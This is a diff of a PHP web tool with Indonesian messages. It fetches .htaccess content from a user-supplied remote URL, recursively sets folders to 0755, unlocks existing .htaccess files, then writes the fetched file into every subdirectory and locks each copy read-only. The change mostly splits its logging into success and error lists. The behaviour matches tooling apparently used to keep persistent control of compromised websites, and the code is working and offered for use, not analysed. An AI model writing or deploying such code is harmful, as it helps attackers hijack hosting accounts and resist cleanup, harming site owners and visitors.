@@ -20,65 +20,68 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $url = $_POST['htaccess_url'];
 
     if (!is_dir($targetPath)) {
-        die("❌ Target path not found: $targetPath");
-    }
-
-    $htaccessContent = fetchFileFromUrl($url);
-    if (!$htaccessContent) {
-        die("❌ Gagal ambil isi .htaccess dari URL.");
-    }
-
-    function setFolders0755($dir, &$log) {
-        foreach (scandir($dir) as $item) {
-            if ($item === '.' || $item === '..') continue;
-            $path = $dir . '/' . $item;
-            if (is_dir($path)) {
-                if (@chmod($path, 0755)) {
-                    $log[] = "✅ Folder chmod 0755: $path";
-                } else {
-                    $log[] = "⚠️ Gagal chmod folder: $path";
-                }
-                setFolders0755($path, $log);
-            }
-        }
-    }
-
-    function unlockHtaccessFiles($dir, &$log) {
-        foreach (scandir($dir) as $item) {
-            if ($item === '.' || $item === '..') continue;
-            $path = $dir . '/' . $item;
-            if (is_dir($path)) {
-                unlockHtaccessFiles($path, $log);
-            } elseif ($item === '.htaccess') {
-                if (@chmod($path, 0644)) {
-                    $log[] = "✅ Unlock .htaccess: $path";
-                } else {
-                    $log[] = "⚠️ Gagal unlock .htaccess: $path";
+        $error[] = "❌ Target path not found: $targetPath";
+    } else {
+        $htaccessContent = fetchFileFromUrl($url);
+        if (!$htaccessContent) {
+            $error[] = "❌ Gagal ambil isi .htaccess dari URL.";
+        } else {
+            function setFolders0755($dir, &$success, &$error) {
+                foreach (scandir($dir) as $item) {
+                    if ($item === '.' || $item === '..') continue;
+                    $path = $dir . '/' . $item;
+                    if (is_dir($path)) {
+                        if (@chmod($path, 0755)) {
+                            $success[] = "✅ Folder chmod 0755: $path";
+                        } else {
+                            $error[] = "❌ Gagal chmod folder: $path (mungkin permission denied)";
+                        }
+                        setFolders0755($path, $success, $error);
+                    }
                 }
             }
-        }
-    }
 
-    function deployHtaccess($dir, $content, &$log) {
-        foreach (scandir($dir) as $item) {
-            if ($item === '.' || $item === '..') continue;
-            $path = $dir . '/' . $item;
-            if (is_dir($path)) {
-                $htaccessPath = $path . '/.htaccess';
-                if (@file_put_contents($htaccessPath, $content) !== false) {
-                    @chmod($htaccessPath, 0444);
-                    $log[] = "✅ Deployed .htaccess to: $htaccessPath";
-                } else {
-                    $log[] = "❌ Gagal deploy ke: $htaccessPath";
+            function unlockHtaccessFiles($dir, &$success, &$error) {
+                foreach (scandir($dir) as $item) {
+                    if ($item === '.' || $item === '..') continue;
+                    $path = $dir . '/' . $item;
+                    if (is_dir($path)) {
+                        unlockHtaccessFiles($path, $success, $error);
+                    } elseif ($item === '.htaccess') {
+                        if (@chmod($path, 0644)) {
+                            $success[] = "✅ Unlock .htaccess: $path";
+                        } else {
+                            $error[] = "❌ Gagal unlock .htaccess: $path (mungkin file tidak dimiliki user ini)";
+                        }
+                    }
                 }
-                deployHtaccess($path, $content, $log);
             }
+
+            function deployHtaccess($dir, $content, &$success, &$error) {
+                foreach (scandir($dir) as $item) {
+                    if ($item === '.' || $item === '..') continue;
+                    $path = $dir . '/' . $item;
+                    if (is_dir($path)) {
+                        $htaccessPath = $path . '/.htaccess';
+                        if (@file_put_contents($htaccessPath, $content) !== false) {
+                            if (@chmod($htaccessPath, 0444)) {
+                                $success[] = "✅ Deployed & chmod .htaccess: $htaccessPath";
+                            } else {
+                                $error[] = "❌ Gagal chmod .htaccess 0444: $htaccessPath";
+                            }
+                        } else {
+                            $error[] = "❌ Gagal deploy ke: $htaccessPath (tidak bisa menulis file)";
+                        }
+                        deployHtaccess($path, $content, $success, $error);
+                    }
+                }
+            }
+
+            setFolders0755($targetPath, $success, $error);
+            unlockHtaccessFiles($targetPath, $success, $error);
+            deployHtaccess($targetPath, $htaccessContent, $success, $error);
         }
     }
-
-    setFolders0755($targetPath, $success);
-    unlockHtaccessFiles($targetPath, $success);
-    deployHtaccess($targetPath, $htaccessContent, $success);
 }
 ?>
 
@@ -109,9 +112,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     <?php if (!empty($success)): ?>
         <div class="log">
-            <h3>📋 Log:</h3>
+            <h3>✅ Success Log:</h3>
             <?php foreach ($success as $line): ?>
-                <div class="<?= strpos($line, '✅') !== false ? 'success' : 'error' ?>"><?= htmlspecialchars($line) ?></div>
+                <div class="success">✔ <?= htmlspecialchars($line) ?></div>
+            <?php endforeach; ?>
+        </div>
+    <?php endif; ?>
+
+    <?php if (!empty($error)): ?>
+        <div class="log">
+            <h3>❌ Error Log:</h3>
+            <?php foreach ($error as $line): ?>
+                <div class="error">✖ <?= htmlspecialchars($line) ?></div>
             <?php endforeach; ?>
         </div>
     <?php endif; ?>
